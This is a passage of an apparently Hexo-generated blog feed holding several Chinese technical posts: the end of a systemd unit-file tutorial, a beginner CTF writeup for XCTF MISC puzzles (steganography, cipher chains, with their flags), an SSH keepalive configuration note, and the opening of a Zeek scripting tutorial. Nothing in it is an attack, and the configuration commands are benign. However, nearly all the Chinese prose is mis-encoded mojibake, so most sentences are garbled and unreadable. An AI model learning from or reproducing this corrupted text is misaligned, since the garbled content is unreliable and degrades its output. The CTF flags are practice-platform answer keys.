title="[Unit]åŒºå—ï¼šå¯åŠ¨é¡ºåºä¸ä¾èµ–å…³ç³»"></a>[Unit]åŒºå—ï¼šå¯åŠ¨é¡ºåºä¸ä¾èµ–å…³ç³»</h3><p><strong>æœåŠ¡æè¿°ï¼š</strong></p><ul><li>Descriptionï¼šç»™å‡ºå½“å‰æœåŠ¡çš„ç®€å•æè¿°</li><li>Documentationï¼šç»™å‡ºæ–‡æ¡£ä½ç½®</li></ul><p><strong>å¯åŠ¨é¡ºåºï¼š</strong></p><ul><li>Afterï¼šå®šä¹‰xxx.serviceåº”è¯¥åœ¨å“ªäº›targetæˆ–serviceæœåŠ¡ä¹‹åå¯åŠ¨</li><li>Beforeï¼šå®šä¹‰xxx.serviceåº”è¯¥åœ¨å“ªäº›targetæˆ–serviceæœåŠ¡ä¹‹å‰å¯åŠ¨</li></ul><p><strong>ä¾èµ–å…³ç³»ï¼š</strong></p><ul><li>Wantsï¼šè¡¨ç¤ºxxx.serviceä¸å®šä¹‰çš„æœåŠ¡å­˜åœ¨â€œå¼±ä¾èµ–â€å…³ç³»ï¼Œå³æŒ‡å®šçš„æœåŠ¡å¯åŠ¨å¤±è´¥æˆ–åœæ­¢è¿è¡Œä¸å½±å“xxxçš„å…è¡Œ</li><li>Requiresï¼šåˆ™è¡¨ç¤ºâ€å¼ºä¾èµ–â€å…³ç³»ï¼Œå³æŒ‡å®šæœåŠ¡å¯åŠ¨å¤±è´¥æˆ–å¼‚å¸¸é€€å‡ºï¼Œé‚£ä¹ˆxxxä¹Ÿå¿…é¡»é€€å‡ºï¼›åä¹‹xxxå¯åŠ¨åˆ™æŒ‡å®šæœåŠ¡ä¹Ÿä¼šå¯åŠ¨</li></ul><h3 id="Service-åŒºå—ï¼šå¯åŠ¨è¡Œä¸ºå®šä¹‰"><a href="#Service-åŒºå—ï¼šå¯åŠ¨è¡Œä¸ºå®šä¹‰" class="headerlink" title="[Service]åŒºå—ï¼šå¯åŠ¨è¡Œä¸ºå®šä¹‰"></a>[Service]åŒºå—ï¼šå¯åŠ¨è¡Œä¸ºå®šä¹‰</h3><p><strong>å¯åŠ¨å‘½ä»¤ï¼š</strong></p><ul><li>EnvironmentFileï¼šæŒ‡å®šå½“å‰æœåŠ¡çš„ç¯å¢ƒå‚æ•°æ–‡ä»¶(è·¯å¾„)ï¼Œå¦‚<code>EnviromentFile=-/etc/sysconfig/xxx</code>ï¼Œè¿è¯å·è¡¨ç¤ºæŠ‘åˆ¶é”™è¯¯ï¼Œå³å‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¸å½±å“å…¶ä»–å‘½ä»¤çš„æ‰§è¡Œ</li><li>Environmentï¼šåé¢æ¥å¤šä¸ªä¸åŒçš„shellå˜é‡ï¼Œå¦‚Environment=DATA_DIR=/dir/data</li><li>Userï¼šè®¾ç½®æœåŠ¡è¿è¡Œçš„ç”¨æˆ·</li><li>Groupï¼šè®¾ç½®æœåŠ¡è¿è¡Œçš„ç”¨æˆ·ç»„</li><li>WorkingDirectoryï¼šè®¾ç½®æœåŠ¡è¿è¡Œçš„è·¯å¾„</li><li>Exec*ï¼šå„ç§ä¸æ‰§è¡Œç›¸å…³çš„å‘½ä»¤<ul><li>ExecStartï¼šå®šä¹‰å¯åŠ¨æœåŠ¡æ—¶æ‰§è¡Œçš„å‘½ä»¤</li><li>ExecStopï¼šå®šä¹‰åœæ­¢æœåŠ¡æ—¶æ‰§è¡Œçš„å‘½ä»¤ </li><li>ExecStartPreï¼šå®šä¹‰å¯åŠ¨æœåŠ¡å‰æ‰§è¡Œçš„å‘½ä»¤ </li><li>ExecStartPostï¼šå®šä¹‰å¯åŠ¨æœåŠ¡åæ‰§è¡Œçš„å‘½ä»¤</li><li>ExecStopPostï¼šå®šä¹‰åœæ­¢æœåŠ¡åæ‰§è¡Œçš„å‘½ä»¤</li><li>ExecReloadï¼šå®šä¹‰é‡å¯æœåŠ¡æ—¶æ‰§è¡Œçš„å‘½ä»¤ </li></ul></li></ul><p><strong>å¯åŠ¨ç±»å‹ï¼š</strong></p><ul><li>Typeï¼šå­—æ®µå®šä¹‰å¯åŠ¨ç±»å‹ï¼Œå¯ä»¥è®¾ç½®çš„å€¼å¦‚ä¸‹<ul><li>simpleï¼ˆé»˜è®¤å€¼ï¼‰ï¼š<code>ExecStart</code>å­—æ®µå¯åŠ¨çš„è¿›ç¨‹ä¸ºä¸»è¿›ç¨‹ï¼Œå³ç›´æ¥å¯åŠ¨æœåŠ¡è¿›ç¨‹</li><li>forkingï¼š<code>ExecStart</code>å­—æ®µå°†ä»¥<code>fork()</code>æ–¹å¼å¯åŠ¨ï¼Œæ­¤æ—¶çˆ¶è¿›ç¨‹å°†ä¼šé€€å‡ºï¼Œå­è¿›ç¨‹å°†æˆä¸ºä¸»è¿›ç¨‹ï¼ˆä¾‹å¦‚ç”¨shellè„šæœ¬å¯åŠ¨æœåŠ¡è¿›ç¨‹ï¼‰</li><li>oneshotï¼šç±»ä¼¼äº<code>simple</code>ï¼Œä½†åª<strong>æ‰§è¡Œä¸€æ¬¡</strong>ï¼ŒSystemd ä¼šç­‰å®ƒæ‰§è¡Œå®Œï¼Œæ‰å¯åŠ¨å…¶ä»–æœåŠ¡</li><li>dbusï¼šç±»ä¼¼äº<code>simple</code>ï¼Œä½†ä¼šç­‰å¾… D-Bus ä¿¡å·åå¯åŠ¨</li><li>notifyï¼šç±»ä¼¼äº<code>simple</code>ï¼Œå¯åŠ¨ç»“æŸåä¼šå‘å‡ºé€šçŸ¥ä¿¡å·ï¼Œç„¶å Systemd å†å¯åŠ¨å…¶ä»–æœåŠ¡</li><li>idleï¼šç±»ä¼¼äº<code>simple</code>ï¼Œä½†æ˜¯è¦ç­‰åˆ°å…¶ä»–ä»»åŠ¡éƒ½æ‰§è¡Œå®Œï¼Œæ‰ä¼šå¯åŠ¨è¯¥æœåŠ¡ã€‚ä¸€ç§ä½¿ç”¨åœºåˆæ˜¯ä¸ºè®©è¯¥æœåŠ¡çš„è¾“å‡ºï¼Œä¸ä¸å…¶ä»–æœåŠ¡çš„è¾“å‡ºç›¸æ··åˆ</li></ul></li><li>RemainAfterExitï¼šè®¾ä¸º<code>yes</code>ï¼Œè¡¨ç¤ºè¿›ç¨‹é€€å‡ºä»¥åï¼ŒæœåŠ¡ä»ç„¶ä¿æŒæ‰§è¡Œ</li></ul><p><strong>é‡å¯è¡Œä¸ºï¼š</strong></p><ul><li>KillModeï¼šå®šä¹‰ Systemd å¦‚ä½•åœæ­¢æœåŠ¡ï¼Œå¯ä»¥è®¾ç½®çš„å€¼å¦‚ä¸‹<ul><li>control-groupï¼ˆdefaultï¼‰ï¼šå½“å‰æ§åˆ¶ç»„é‡Œé¢çš„æ‰€æœ‰å­è¿›ç¨‹ï¼Œéƒ½ä¼šè¢«æ€æ‰</li><li>processï¼šåªæ€ä¸»è¿›ç¨‹</li><li>mixedï¼šä¸»è¿›ç¨‹å°†æ”¶åˆ° SIGTERM ä¿¡å·ï¼Œå­è¿›ç¨‹æ”¶åˆ° SIGKILL ä¿¡å·</li><li>noneï¼šæ²¡æœ‰è¿›ç¨‹ä¼šè¢«æ€æ‰ï¼Œåªæ˜¯æ‰§è¡ŒæœåŠ¡çš„ stop å‘½ä»¤</li></ul></li><li>Restartï¼šå®šä¹‰äº†æœåŠ¡é€€å‡ºåï¼ŒSystemd çš„é‡å¯æ–¹å¼ï¼Œå¯ä»¥è®¾ç½®çš„å€¼å¦‚ä¸‹ï¼ˆå¯¹äºå®ˆæŠ¤è¿›ç¨‹ï¼Œæ¨èè®¾ä¸º<code>on-failure</code>ã€‚å¯¹äºé‚£äº›å…è®¸å‘ç”Ÿé”™è¯¯é€€å‡ºçš„æœåŠ¡ï¼Œå¯ä»¥è®¾ä¸º<code>on-abnormal</code>ï¼‰<ul><li>noï¼ˆdefaultï¼‰ï¼šé€€å‡ºåä¸ä¼šé‡å¯</li><li>on-successï¼šåªæœ‰æ­£å¸¸é€€å‡ºæ—¶ï¼ˆé€€å‡ºçŠ¶æ€ç ä¸º0ï¼‰ï¼Œæ‰ä¼šé‡å¯</li><li>on-failureï¼šéæ­£å¸¸é€€å‡ºæ—¶ï¼ˆé€€å‡ºçŠ¶æ€ç é0ï¼‰ï¼ŒåŒ…æ‹¬è¢«ä¿¡å·ç»ˆæ­¢å’Œè¶…æ—¶ï¼Œæ‰ä¼šé‡å¯</li><li>on-abnormalï¼šåªæœ‰è¢«ä¿¡å·ç»ˆæ­¢å’Œè¶…æ—¶ï¼Œæ‰ä¼šé‡å¯</li><li>on-abortï¼šåªæœ‰åœ¨æ”¶åˆ°æ²¡æœ‰æ•æ‰åˆ°çš„ä¿¡å·ç»ˆæ­¢æ—¶ï¼Œæ‰ä¼šé‡å¯</li><li>on-watchdogï¼šè¶…æ—¶é€€å‡ºï¼Œæ‰ä¼šé‡å¯</li><li>alwaysï¼šä¸ç®¡æ˜¯ä»€ä¹ˆé€€å‡ºåŸå› ï¼Œæ€»æ˜¯é‡å¯</li></ul></li><li>RestartSecï¼šè¡¨ç¤º Systemd é‡å¯æœåŠ¡ä¹‹å‰ï¼Œéœ€è¦ç­‰å¾…çš„ç§’æ•°</li></ul><h3 id="Install-åŒºå—ï¼šæœåŠ¡å®‰è£…å®šä¹‰"><a href="#Install-åŒºå—ï¼šæœåŠ¡å®‰è£…å®šä¹‰" class="headerlink" title="[Install]åŒºå—ï¼šæœåŠ¡å®‰è£…å®šä¹‰"></a>[Install]åŒºå—ï¼šæœåŠ¡å®‰è£…å®šä¹‰</h3><ul><li>WantedByï¼šè¡¨ç¤ºè¯¥æœåŠ¡æ‰€åœ¨çš„ Target</li></ul><p>Targetçš„å«ä¹‰æ˜¯æœåŠ¡ç»„ï¼Œå¦‚<code>WantedBy=multi-user.target</code>æŒ‡çš„æ˜¯è¯¥æœåŠ¡æ‰€å±äº<code>multi-user.target</code>ã€‚å½“æ‰§è¡Œ<code>systemctl enable xxx.service</code>å‘½ä»¤æ—¶ï¼Œ<code>xxx.service</code>çš„ç¬¦å·é“¾æ¥å°±ä¼šè¢«åˆ›å»ºåœ¨<code>/etc/systemd/system/multi-user.target</code>ç›®å½•ä¸‹ã€‚</p><p>å¯ä»¥é€šè¿‡<code>systemctl get-default</code>å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿé»˜è®¤å¯åŠ¨çš„targetï¼Œä¸€èˆ¬ä¸º<code>multi-user</code>æˆ–è€…æ˜¯<code>graphical</code>ã€‚å› æ­¤é…ç½®å¥½ç›¸åº”çš„WantedByå­—æ®µï¼Œå¯ä»¥å®ç°æœåŠ¡çš„å¼€æœºå¯åŠ¨ã€‚</p><h2 id="4-å‚è€ƒæ–‡ç« "><a href="#4-å‚è€ƒæ–‡ç« " class="headerlink" title="4 å‚è€ƒæ–‡ç« "></a>4 å‚è€ƒæ–‡ç« </h2><p><a href="https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html">[1]ã€é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—ã€‘Systemd å…¥é—¨æ•™ç¨‹ï¼šå®æˆ˜ç¯‡</a></p><p><a href="https://www.cnblogs.com/wang-yc/p/8876155.html">[2]  Centos7 è‡ªå®šä¹‰systemctlæœåŠ¡è„šæœ¬</a></p><p><a href="https://blog.csdn.net/u010127879/article/details/38018825">[3]  ç¼–å†™systemdä¸‹æœåŠ¡è„šæœ¬</a></p><p><a href="https://wiki.archlinux.org/index.php/Systemd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">[4]  systemd Wikiç®€ä½“ä¸­æ–‡</a>)</p>]]></content>
    
    
    <categories>
      
      <category>Configuration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ-MISCæ–°æ‰‹åŒº-Writeup</title>
    <link href="/2020/04/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MISC%E6%96%B0%E6%89%8B%E5%8C%BA-Writeup/"/>
    <url>/2020/04/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MISC%E6%96%B0%E6%89%8B%E5%8C%BA-Writeup/</url>
    
    <content type="html"><![CDATA[<p>XCTFçº¿ä¸Šç»ƒä¹ ç½‘ç«™<a href="https://adworld.xctf.org.cn/">æ”»é˜²ä¸–ç•Œ</a>ï¼ŒMISCæ–¹å‘çš„æ–°æ‰‹åŒºWriteupã€‚ç¬¬ä¸€æ¬¡åšCTFç»ƒä¹ é¢˜ï¼Œç¬¬ä¸€æ¬¡å†™Writeup(/â–½ï¼¼)</p><span id="more"></span><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}</p><p><strong>é¢˜ç›®åˆ†æï¼š</strong>æ˜¾ç„¶å¯èƒ½çš„é€‰é¡¹åªæœ‰ä¸¤ä¸ªï¼š<code>flag&#123;xxx&#125;</code>å’Œ<code>flag&#123;th1s_!s_a_d4m0_4la9&#125;</code></p><pre><code class="hljs txt">flag&#123;th1s_!s_a_d4m0_4la9&#125;</code></pre><p><strong>é¢˜ç›®æ€»ç»“ï¼š</strong>ä½œä¸ºæ–°æ‰‹åŒºçš„ç¬¬ä¸€é¢˜å®ƒè¿˜æ˜¯å¾ˆå‹å¥½çš„ï¼Œå¹¶å€Ÿæ­¤å‘Šè¯‰äº†æˆ‘ä»¬ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><ul><li>CTFçš„flagä¸€èˆ¬é•¿è¿™æ ·: flag{xxx}ï¼Œå¹¶è¦æ³¨æ„æäº¤çš„æ ¼å¼</li><li>CTFçš„flagå¾€å¾€å°±åœ¨ä½ æ„æƒ³ä¸åˆ°çš„åœ°æ–¹</li></ul><h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>èœçŒ«ç»™äº†èœç‹—ä¸€å¼ å›¾ï¼Œè¯´å›¾ä¸‹é¢ä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚<a href="https://adworld.xctf.org.cn/media/task/attachments/ad00be3652ac4301a71dedd2708f78b8.pdf">é™„ä»¶ä¸‹è½½åœ°å€</a></p><p><strong>é¢˜ç›®åˆ†æï¼š</strong>é¡¾é¢˜æ€æ„ï¼ŒèœçŒ«è¯´å›¾ä¸‹ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œè¿™æ˜¯æœ¬é¢˜<strong>æ˜é¢ä¸Šçš„å”¯ä¸€çº¿ç´¢</strong>ï¼Œå› æ­¤æ€€ç–‘å›¾ç‰‡ä¸‹è—æœ‰flag</p><ul><li>è¿›å…¥Aadobe Acrobatç¼–è¾‘æ¨¡å¼ï¼Œå°†å›¾ç‰‡æŒªå¼€ï¼Œå³å¯å¾—åˆ°flag</li><li>é€šè¿‡<a href="https://github.com/QGrain/Document-Transformer">pandoc</a>å°†pdfè½¬wordä¹Ÿå¯ä»¥ç§»å¼€å¾—åˆ°flag</li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200411214041.png" width=460></p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200411215126.png" width=460></p><pre><code class="hljs txt">flag&#123;security_through_obscurity&#125;</code></pre><p><strong>é¢˜ç›®æ€»ç»“ï¼š</strong>æ­£å¦‚flagé‡Œæ‰€è¯´ï¼Œéšæ™¦çš„åœ°æ–¹å¾€å¾€å¯èƒ½è—æœ‰ç­”æ¡ˆï¼Œæ¯”å¦‚å›¾ç‰‡çš„ä¸‹é¢ï¼Œç”šè‡³æ˜¯é‡Œé¢ï¼ˆåé¢ä¼šé‡åˆ°ï¼‰</p><h2 id="å¦‚æ¥åä¸‰æŒ"><a href="#å¦‚æ¥åä¸‰æŒ" class="headerlink" title="å¦‚æ¥åä¸‰æŒ"></a>å¦‚æ¥åä¸‰æŒ</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>èœç‹—ä¸ºäº†æ‰“è´¥èœçŒ«ï¼Œå­¦äº†ä¸€å¥—å¦‚æ¥åä¸‰æŒã€‚<a href="https://adworld.xctf.org.cn/media/task/attachments/833e81c19b2b4726986bd6a606d64f3c.docx">é™„ä»¶ä¸‹è½½åœ°å€</a></p><p><strong>é¢˜ç›®åˆ†æï¼š</strong>ä¸‹è½½é™„ä»¶åå‘ç°æ˜¯ä¸€ä¸ªdocxï¼š</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200411224232.png" width = 600></p><p>è¿™æ®µèœœæ±ç¹ä½“å­—è®©äººä¸ç”±å¾—è”æƒ³åˆ°è‘—åçš„â€œä¸ä½›è®ºç¦…â€ï¼šä¸€ä¸ªåŠ è§£å¯†<a href="http://keyfc.net/bbs/tools/tudoucode.aspx">ç½‘ç«™</a>:</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200411224839.png" width=400></p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200411225124.png" width=400></p><p>æŒ‰<code>æ™®æ¸¡ä¼—ç”Ÿ</code>ä¸­çš„æç¤ºï¼Œåœ¨å¯†æ–‡å‰åŠ å…¥<code>ä½›æ›°ï¼š</code>æˆåŠŸè§£å¯†ï¼Œå¾—åˆ°ä»¥ä¸‹åŠ å¯†å­—ç¬¦ä¸²ï¼š</p><pre><code class="hljs txt">MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code></pre><p>ä»ç„¶ä¸æ˜¯flagæ ¼å¼ï¼Œæ€€ç–‘ä»éœ€è¦è§£å¯†ï¼Œå› æ­¤å°è¯•å¸¸è§çš„å‡ ç§ä¸éœ€è¦å¯†é’¥çš„åŠ è§£å¯†ï¼Œæ­¤å¤„è”ç³»é¢˜ç›®æåˆ°çš„å¦‚æ¥åä¸‰æŒï¼Œå› æ­¤å°è¯•rot13è§£ç ï¼š</p><pre><code class="hljs txt">zmxhz3tizhnjamhia3ptbmzyzghidmnrawpuzhnrdmjramrzywj9</code></pre><p>æœ€ç»ˆé€šè¿‡base64è§£ç å¾—åˆ°flagï¼š</p><pre><code class="hljs txt">flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</code></pre><p><strong>é¢˜ç›®æ€»ç»“ï¼š</strong></p><ul><li><strong>åè¡€ä½“éªŒï¼Œæ­£æ‰€è°“â€œæ´»ä¹…è§â€ï¼Œåšçš„é¢˜ç›®å¤šäº†ï¼Œè‡ªç„¶ä¹Ÿç†Ÿç»ƒäº†</strong></li><li>ä¹Ÿæ˜ç™½äº†MISCå–œæ¬¢ç»“åˆå¤å…¸/ç°ä»£åŠ å¯†æ–¹å¼å»éšè—å¯†é’¥ï¼Œå¥‡æ€ªçš„çŸ¥è¯†å¢é•¿äº†.jpg</li></ul><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>èœç‹—æ‰¾åˆ°äº†æ–‡ä»¶ä¸­çš„å½©è›‹å¾ˆå¼€å¿ƒï¼Œç»™èœçŒ«å‘äº†ä¸ªè¡¨æƒ…åŒ…ã€‚<a href="https://adworld.xctf.org.cn/media/task/attachments/4b0799f9a4d649f09a882b6b1130bb70.gif">é™„ä»¶ä¸‹è½½åœ°å€</a></p><p><strong>é¢˜ç›®åˆ†æï¼š</strong>ä¸‹è½½çš„é™„ä»¶å…ˆå°è¯•ä¸€ä¸‹æ‰“å¼€çœ‹çœ‹æ˜¯å¦èƒ½å¾—åˆ°ä»€ä¹ˆä¿¡æ¯ï¼Œç»“æœå‘ç°gifçš„æœ€åä¸€å¸§æœ‰ä¸€å¼ äºŒç»´ç ä¸€é—ªè€Œè¿‡ï¼Œé™¤éä½ æ˜¯<strong>å¤šå¹´ç»ƒå°±çš„ç¥æ‰‹é€Ÿ</strong>ï¼Œä¸ç„¶æ˜¯æˆªä¸åˆ°çš„ã€‚</p><p>å› æ­¤å¾—å¦å¯»ä»–æ³•ï¼Œæ­¤å¤„æ¨èä¸€ä¸ªéšå†™è§£æçš„å¼ºåŠ›å·¥å…·<a href="https://github.com/zardus/ctf-tools/tree/master/stegsolve">StegSolve</a>ï¼Œé€šè¿‡Frame BrowseråŠŸèƒ½è½»æ¾å¾—åˆ°äºŒç»´ç ï¼š</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/frame50.png" align="middle" /></p><p>é‚£ä¹ˆä¸‹ä¸€æ­¥çš„ç›®çš„å°±å¾ˆæ˜ç¡®äº†ï¼Œè¡¥é½äºŒç»´ç çš„å®šä½æ ‡è¯†ã€‚ä¸‹è½½å®šä½æ ‡è¯†çš„å›¾ç‰‡ï¼Œé€šè¿‡<a href="https://ps.gaoding.com/">åœ¨çº¿ps</a>è´´ä¸Šå»å³å¯ï¼š</p><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/frame50-fixed.png" align=middle></p><pre><code class="hljs txt">flag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;</code></pre><p><strong>é¢˜ç›®æ€»ç»“ï¼š</strong></p><ul><li>åªè¦å·¥å…·ç”¨å¾—å¥½ï¼Œä¸æ„flagæ²¡å¾—æ‰¾</li><li>è¦æƒ³åšå¥½MISCï¼Œå®³çš„å­¦å¥½PS</li></ul><h2 id="åšæŒ60s"><a href="#åšæŒ60s" class="headerlink" title="åšæŒ60s"></a>åšæŒ60s</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p><strong>é¢˜ç›®åˆ†æï¼š</strong></p><p><strong>é¢˜ç›®æ€»ç»“ï¼š</strong></p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>Done, to be completed</p><h2 id="æ€æ¡Œå­"><a href="#æ€æ¡Œå­" class="headerlink" title="æ€æ¡Œå­"></a>æ€æ¡Œå­</h2><p>Done, to be completed</p><h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>Done, to be completed</p><h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>Done, to be completed</p><h2 id="SimepleRAR"><a href="#SimepleRAR" class="headerlink" title="SimepleRAR"></a>SimepleRAR</h2><p>Done, to be completed</p><h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p>todo</p><h2 id="åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€"><a href="#åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€" class="headerlink" title="åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€"></a>åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€</h2><p>todo</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSHä¿æŒé•¿è¿æ¥</title>
    <link href="/2020/03/27/SSH%E4%BF%9D%E6%8C%81%E9%95%BF%E8%BF%9E%E6%8E%A5/"/>
    <url>/2020/03/27/SSH%E4%BF%9D%E6%8C%81%E9%95%BF%E8%BF%9E%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SSHä¿æŒé•¿è¿æ¥"><a href="#SSHä¿æŒé•¿è¿æ¥" class="headerlink" title="SSHä¿æŒé•¿è¿æ¥"></a>SSHä¿æŒé•¿è¿æ¥</h1><p>SSHç™»å½•æœåŠ¡å™¨è€Œè¾ƒé•¿æ—¶é—´ä¸è¿›è¡Œæ“ä½œï¼Œè¿æ¥ä¼šç”±æœåŠ¡å™¨è‡ªåŠ¨æ–­å¼€ï¼Œå¯¼è‡´æ§åˆ¶å°å¡æ­»ã€‚ä¸ºäº†ä¿æŒSSHçš„é•¿è¿æ¥ï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š</p><span id="more"></span><h2 id="1-å®¢æˆ·ç«¯ä¸»åŠ¨ä¿æŒè¿æ¥"><a href="#1-å®¢æˆ·ç«¯ä¸»åŠ¨ä¿æŒè¿æ¥" class="headerlink" title="1 å®¢æˆ·ç«¯ä¸»åŠ¨ä¿æŒè¿æ¥"></a>1 å®¢æˆ·ç«¯ä¸»åŠ¨ä¿æŒè¿æ¥</h2><ul><li>ç¼–è¾‘<code>/etc/ssh/ssh_config</code>æˆ–è€…<code>~/.ssh/config</code>ï¼Œè¿½åŠ ä»¥ä¸‹å†…å®¹</li></ul><pre><code class="hljs bash">TCPKeepAlive=<span class="hljs-built_in">yes</span><span class="hljs-comment"># Clientæ¯éš” 180 ç§’å‘é€ä¸€æ¬¡KeepAliveè¯·æ±‚ç»™Serverï¼Œç„¶åServerå“åº”ä»è€Œä¿æŒè¿æ¥</span>ServerAliveInterval 180<span class="hljs-comment"># Clientå‘å‡ºè¯·æ±‚åï¼ŒæœåŠ¡å™¨ç«¯æœªå“åº”æ¬¡æ•°è¾¾åˆ°3ï¼Œå°±è‡ªåŠ¨æ–­å¼€è¿æ¥ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼ŒServeråŸºæœ¬ä¼šå“åº”ã€‚</span>ServerAliveCountMax 3</code></pre><h2 id="2-æœåŠ¡ç«¯ä¸»åŠ¨ä¿æŒè¿æ¥"><a href="#2-æœåŠ¡ç«¯ä¸»åŠ¨ä¿æŒè¿æ¥" class="headerlink" title="2 æœåŠ¡ç«¯ä¸»åŠ¨ä¿æŒè¿æ¥"></a>2 æœåŠ¡ç«¯ä¸»åŠ¨ä¿æŒè¿æ¥</h2><ul><li>ç¼–è¾‘<code>/etc/ssh/sshd_config</code>ï¼Œè¿½åŠ ä»¥ä¸‹å†…å®¹</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># Serveræ¯éš” 180 ç§’å‘é€ä¸€æ¬¡å¿ƒè·³æ•°æ®åŒ…ç»™Clientï¼Œç„¶åClientå“åº”ä»è€Œä¿æŒè¿æ¥</span>ClientAliveInterval 180<span class="hljs-comment"># Serverå‘å‡ºè¯·æ±‚åï¼Œå®¢æˆ·ç«¯æœªå“åº”æ¬¡æ•°è¾¾åˆ°10ï¼Œå°±è‡ªåŠ¨æ–­å¼€è¿æ¥ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼ŒClientåŸºæœ¬ä¼šå“åº”</span>ClientAliveCountMax 10</code></pre><ul><li><strong>é‡å¯sshæœåŠ¡</strong>ä»¥ä½¿é…ç½®ç”Ÿæ•ˆ</li></ul><pre><code class="hljs bash">systemctl restart sshd</code></pre><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.jianshu.com/p/d68b1bf3fc95">[1] SSH ä¿æŒè¿æ¥</a></p><p><a href="https://blog.csdn.net/Earl_yuan/article/details/50454032">[2] SSH ä¿æŒè¿æ¥ ï¼ˆè§£å†³Broken pipeï¼‰</a></p>]]></content>
    
    
    <categories>
      
      <category>Configuration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Zeekè„šæœ¬è¯­è¨€(ä¸€)</title>
    <link href="/2020/03/16/Zeek%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80-%E4%B8%80/"/>
    <url>/2020/03/16/Zeek%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡å°†ä¸»è¦ä»‹ç»å’Œè®²è§£Zeekè„šæœ¬è¯­è¨€çš„<strong>æ•°æ®ç±»å‹</strong>ï¼Œ<strong>åŸºäºè¯­æ³•</strong>å’Œ<strong>å±æ€§</strong></p><span id="more"></span><h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><h3 id="åŸºç¡€æ•°æ®ç±»å‹"><a href="#åŸºç¡€æ•°æ®ç±»å‹" class="headerlink" title="åŸºç¡€æ•°æ®ç±»å‹"></a>åŸºç¡€æ•°æ®ç±»å‹</h3><p><strong>Zeekæœ‰ä»¥ä¸‹å†…å»ºæ•°æ®ç±»å‹</strong></p><div class="table-container"><table><thead><tr><th>åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-bool"><code>bool</code></a></td><td>å¸ƒå°”å‹</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-count"><code>count</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-int"><code>int</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-double"><code>double</code></a></td><td>æ•°å€¼ç±»å‹</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-time"><code>time</code></a>ï¼Œ <a href="https://docs.zeek.org/en/master/script-reference/types.html#type-interval"><code>interval</code></a></td><td>æ—¶é—´ç±»å‹</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-string"><code>string</code></a></td><td>å­—ç¬¦ä¸²</td></tr><tr><td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-pattern"><code>pattern</code></a></td><td>æ­£åˆ™è¡¨è¾¾å¼</td></tr><tr><td><a 